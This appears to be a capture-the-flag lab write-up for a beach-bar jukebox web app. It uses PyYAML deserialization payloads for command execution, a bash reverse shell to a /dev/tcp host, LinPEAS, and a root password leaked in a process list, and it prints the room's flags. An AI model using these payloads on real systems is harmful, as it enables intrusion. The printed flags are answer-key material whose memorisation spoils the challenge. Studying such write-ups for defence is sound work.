**Tags:** Web, Boot2Root.

**Difficulty:** Easy.


## 1. Finding Credentials in the Source Code

We begin by inspecting the source code of the web page. In a comment, we find the following:

```text
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
```

From this, we obtain the test credentials:

```text
Username: dj
Password: dj
```

The page also contains a redirect to:

```text
10.113.161.208/login
```

We try the discovered credentials:

```text
dj:dj
```

This gives us our initial access to the application using the DJ account.

---

## 2. Scanning the Target

We then perform a standard Nmap scan:

```bash
sudo nmap -sS -sV 10.113.161.208
```

Output:

```text
[sudo] password for deb88:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 07:50 EDT
Nmap scan report for 10.113.161.208
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open:

* `22/tcp` — SSH;
* `80/tcp` — HTTP running through Gunicorn.

---

## 3. Web Application Enumeration

We enumerate the web service using Gobuster:

```bash
gobuster dir -u 10.113.161.208 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Output:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.161.208
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 199] [--> /login]
/export               (Status: 302) [Size: 199] [--> /login]
/import               (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 3522]
/logout               (Status: 302) [Size: 199] [--> /login]
Progress: 20481 / 20482 (100.00%)
```

The interesting endpoints are `/dashboard`, `/export`, and `/import`. All of them redirect unauthenticated users to `/login`.

The `/import` endpoint is particularly important because the playlist import functionality is where we later discover a vulnerability.

---

# 4. Testing SSH

Since Nmap discovered SSH, we try using the credentials we found:

```bash
ssh dj@10.113.161.208
```

After accepting the host key:

```text
The authenticity of host '10.113.161.208 (10.113.161.208)' can't be established.
ED25519 key fingerprint is SHA256:JyEbNyMuqCQ6sokoHT+TTXoLujnwAQ6dbXhnypbTSPg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.113.161.208' (ED25519) to the list of known hosts.
dj@10.113.161.208: Permission denied (publickey).
```

SSH does not accept password authentication and requires a public key:

```text
Permission denied (publickey).
```

Therefore, we continue through the web application.

---

# 5. Analyzing the YAML Import

While investigating the playlist import functionality, we discover that the application accepts YAML.

A normal file looks like this:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

However, YAML can be modified so that PyYAML attempts to process a Python object:

```yaml
artist: !!python/object/apply:os.system [id]
```

When processed, the command is executed.

The output contains:

```text
0
```

Here, `0` is the return code of `os.system()`, meaning that the `id` command was successfully executed.

---

# 6. Confirming Command Execution

To confirm that this is not limited to a single command, we try:

```yaml
title: !!python/object/apply:subprocess.check_output
  - id
```

The result is:

```text
'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'
```

This definitively confirms command execution on the server.

The command runs as:

```text
uid=1001(bartender)
gid=1001(bartender)
```

The web application therefore allows arbitrary commands to be executed with the privileges of the `bartender` user.

---

# 7. Getting Information About the Application Directory

We use `subprocess.check_output` to execute `ls -la`:

```yaml
name: !!python/object/apply:subprocess.check_output
   - ["ls", "-la"]
```

We get:

```text
{'playlist': {'name': b'total 24\ndrwxr-xr-x 4 bartender        bartender 4096 Jun 11 13:02 .\ndrwxr-xr-x 5 systemd-coredump ubuntu    4096 Jun 11 13:21 ..\ndrwxr-xr-x 2 bartender        bartender 4096 Jul 28 18:37 __pycache__\n-rw-r--r-- 1 bartender        bartender 2445 Jun 11 13:02 app.py\n-rw-r--r-- 1 bartender        bartender   44 Jun 11 10:47 requirements.txt\ndrwxr-xr-x 2 bartender        bartender 4096 Jun 11 10:47 templates\n', 'vibe': 'golden hour', 'tracks': [{'artist': 'Khruangbin', 'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'}, {'artist': 'Men I Trust', 'title': 'Show Me How'}, {'artist': 'Crumb', 'title': 'Locket'}]}}
```

We can now see the contents of the application directory:

```text
__pycache__/
app.py
requirements.txt
templates/
```

The `requirements.txt` file is particularly interesting because it allows us to identify the versions of the Python libraries being used.

---

# 8. Identifying Application Dependencies

We read `requirements.txt`:

```bash
cat requirments.txt
```

We get:

```text
'name': b'Flask==3.0.3\nPyYAML==6.0.2\ngunicorn==22.0.0\n',
```

The application uses:

```text
Flask==3.0.3
PyYAML==6.0.2
gunicorn==22.0.0
```

The key component here is `PyYAML`, since its unsafe YAML processing allows us to use `!!python/object/apply`.

---

# 9. Getting the First `user.txt` Flag

After confirming RCE, we use the same mechanism to read the user's file:

```yaml
playlist:
  name: !!python/object/apply:subprocess.check_output
     - ["cat", "/home/bartender/user.txt"]
```

The response contains:

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

### User Flag

The YAML deserialization vulnerability therefore allows us to execute `cat` and read the user's flag.

---

# 10. Obtaining a Reverse Shell

Once RCE has been confirmed, we can use it to obtain an interactive shell.

The payload is:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: !!python/object/apply:os.system
     - bash -c "bash -i >& /dev/tcp/192.168.154.82/4444 0>&1"
```

After successful execution, we obtain a shell and move to the root directory:

```bash
cd /
```

We check its contents:

```bash
ls -la
```

Output:

```text
total 10512
drwxr-xr-x  22 root root     4096 Aug  4 09:50 .
drwxr-xr-x  22 root root     4096 Aug  4 09:50 ..
lrwxrwxrwx   1 root root        7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   2 root root     4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   3 root root     4096 Jul 28 18:43 boot
-rw-------   1 root root 10686464 Oct 22  2024 core
drwxr-xr-x  14 root root     3400 Aug  4 09:51 dev
drwxr-xr-x 109 root root    12288 Aug  4 09:50 etc
drwxr-xr-x   4 root root     4096 Jun 11 10:55 home
lrwxrwxrwx   1 root root        7 Oct 26  2020 lib -> usr/lib
drwxr-xr-x   2 root root     4096 Oct  2  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root        9 Oct 26  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root        9 Oct 26  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root       10 Oct 26  2020 libx32 -> usr/lib32
drwx------   2 root root    16384 Oct 26  2020 lost+found
drwxr-xr-x   1 root root     4096 Oct 26  09:50 media
drwxr-xr-x   2 root root     4096 Aug  4  09:50 mnt
drwxr-xr-x   3 root root     4096 Jun 11 10:49 opt
dr-xr-xr-x 175 root root        0 Aug  4  09:50 proc
drwx------   6 root root     4096 Jul 31 09:24 root
drwxrwxrwt  11 root root     4096 Aug  4  10:51 tmp
drwxr-xr-x  14 root root     4096 Aug  4  09:50 usr
drwxr-xr-x  13 root root     4096 Jul 28 18:42 var
```

This shows the filesystem of the machine, including `/root`, `/opt`, `/home`, and other standard directories.

---

# 11. Local Enumeration

On the obtained machine, we run `LinPEAS`.

We first download it to the machine using a Python HTTP server and then execute it from `/tmp`.

This is a standard local enumeration step after obtaining a shell. It checks permissions, processes, configuration files, credentials, SUID/SGID binaries, sudo, and other potential privilege escalation paths.

---

# 12. Checking the Sudo Version

We also check for a potential local sudo vulnerability:

```text
https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh
```

The log shows that the sudo version is:

```text
Sudo version 1.9.15p5
```

which matches the version range being investigated for the CVE. However, exploitation does not produce the desired result.

Therefore, this privilege escalation path is not used.

---

# 13. Finding the Running Jukebox Service

Next, we check for processes related to the jukebox:

```bash
ps aux | grep jukebox
```

We get:

```text
root         609  0.0  0.2  20176 11780 ?        Ss   09:50   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
bartend+   73758  0.0  0.0   7084  2236 pts/0    S+   11:35   0:00 grep --color=auto jukebox
```

This reveals particularly important information.

The `jukeboxd.py` process is running as:

```text
root
```

and its command-line arguments contain:

```text
--stream-pass SunsetSpritz2024!
```

The password is therefore exposed in plaintext in the process list.

---

# 14. Reusing the Password

We try using the discovered password to switch to `root`:

```text
su root
password: SunsetSpritz2024!
```

Privilege escalation succeeds due to **credential reuse**: the password used by the jukebox service is also valid for the `root` account.

---

# 15. Getting `root.txt`

After switching to `root`, we read:

```bash
cat /root/root.txt
```

We get:

```text
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

# Attack Chain

The complete room can be solved through the following chain:

```text
Web page source
        │
        ▼
Leaked credentials
dj:dj
        │
        ▼
Web login
        │
        ▼
/import
        │
        ▼
Unsafe YAML deserialization
PyYAML !!python/object/apply
        │
        ▼
Arbitrary Command Execution
        │
        ├── id
        ├── ls
        └── cat /home/bartender/user.txt
                    │
                    ▼
        THM{y4ml_pl4yl1st_pwns_th3_b34ch}
        │
        ▼
Reverse Shell
        │
        ▼
bartender shell
        │
        ▼
ps aux | grep jukebox
        │
        ▼
Root process exposes password
SunsetSpritz2024!
        │
        ▼
su root
        │
        ▼
cat /root/root.txt
        │
        ▼
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

### Flags

**User:**

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

**Root:**

```text
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

The main vulnerabilities in the room are **leftover test credentials, unsafe YAML deserialization leading to RCE, and password reuse where the root password is exposed through the arguments of a running service**.
